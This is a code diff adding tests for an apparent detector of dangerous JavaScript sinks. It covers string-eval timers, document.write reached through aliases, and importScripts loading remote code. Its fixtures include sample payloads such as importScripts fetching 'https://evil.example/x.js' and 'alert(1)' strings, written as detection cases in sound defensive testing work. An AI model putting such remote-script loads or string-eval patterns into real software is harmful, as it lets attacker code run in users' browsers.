@@ -867,6 +867,54 @@ describe('a receiver-specific DOM sink reached through an ALIAS', () => {
   });
 });
 
+describe('every mechanism, with every predicate', () => {
+  // The point of resolving value flow through ONE relation.  Three separate
+  // walkers each knew a different subset of mechanisms, so a sink NAME resolved
+  // through a container while a code-argument PREDICATE applied to the same
+  // container did not.  Four of these were live false negatives before the
+  // relation was unified; the rest are the combinations that must keep working.
+  const imports = [...DYNAMIC_CODE_SINKS, REMOTE_IMPORT_SCRIPTS_SINK];
+  const remote = (code: string): boolean => findDynamicCodeSinks(code, imports).length > 0;
+  const dom = (code: string): boolean => findMemberSinkUses(code, DOM_MEMBER_SINKS).length > 0;
+
+  it.each([
+    [
+      'a timer string through a function return',
+      "const get = () => 'alert(1)'; setTimeout(get(), 0)",
+    ],
+    ['a timer string through a container', "const o = { code: 'alert(1)' }; setTimeout(o.code, 0)"],
+    ['a timer string through a later assignment', "let c; c = 'alert(1)'; setTimeout(c, 0)"],
+    [
+      'a timer string through destructuring',
+      "const { code } = { code: 'alert(1)' }; setTimeout(code, 0)",
+    ],
+  ])('applies the STRING predicate through %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it.each([
+    ['a binding', "const u = 'https://evil.example/x.js'; importScripts(u)"],
+    ['a selection', "importScripts(fallback || 'https://evil.example/x.js')"],
+    ['a function return', "const u = () => 'https://evil.example/x.js'; importScripts(u())"],
+  ])('applies the URL predicate through %s', (_label, code) => {
+    expect(remote(code)).toBe(true);
+  });
+
+  it.each([
+    ['a container', 'const o = { d: document }; o.d.write(payload)'],
+    ['a function return', 'const get = () => document; get().write(payload)'],
+  ])('resolves a member sink RECEIVER through %s', (_label, code) => {
+    expect(dom(code)).toBe(true);
+  });
+
+  it.each([
+    ['a function argument through a container', 'const o = { fn: tick }; setTimeout(o.fn, 0)'],
+    ['a same-origin URL through a binding', "const u = '/local.js'; importScripts(u)"],
+  ])('still passes %s', (_label, code) => {
+    expect(remote(code)).toBe(false);
+  });
+});
+
 describe('the assembled sink sets', () => {
   it('SOURCE and BUILT agree on every sink form', () => {
     const forms = [
